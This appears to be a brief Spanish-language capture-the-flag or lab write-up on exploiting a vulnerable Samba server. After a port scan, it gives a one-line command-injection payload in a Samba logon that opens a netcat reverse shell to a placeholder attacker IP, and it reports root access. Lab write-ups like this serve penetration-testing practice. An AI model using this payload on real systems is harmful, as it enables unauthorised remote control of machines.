<img src="Pasted%20image%2020240711182035.png">
encontramos que están abiertos los puertos 21,22,139,445.
La versión de samba el vulnerable a una inyección de comandos.

<img src="Pasted%20image%2020240711184518.png">
Tenemos permiso de escritura y de lectura al directorio tmp del servidor con el usuario anonymous.

aprovechamos esto para crear una reverse shell.
```
logon "/=´nc ip_atacante -e /bin/bash´"
```

<img src="Pasted%20image%2020240711185125.png">
Accedemos como root a la máquina.

